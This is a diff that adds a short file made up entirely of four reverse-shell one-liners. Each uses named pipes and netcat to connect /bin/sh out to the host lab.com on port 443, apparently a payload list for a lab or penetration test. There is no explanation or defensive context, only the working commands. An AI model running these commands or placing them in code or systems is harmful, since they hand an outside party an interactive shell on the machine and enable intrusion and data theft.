@@ -1,0 +1,7 @@
+/bin/sh 0</tmp/backpipe | nc lab.com 443 1>/tmp/backpipe
+
+/bin/sh -c "/bin/sh 0</tmp/backpipe | nc lab.com 443 1>/tmp/backpipe"
+
+tail -n 0 -f /tmp/1 | /bin/sh 2>&1 | nc -nv lab.com 443 1> /tmp/1
+
+mkfifo pipe; nc -nv lab.com 443 < pipe | /bin/sh 2>pipe >pipe 
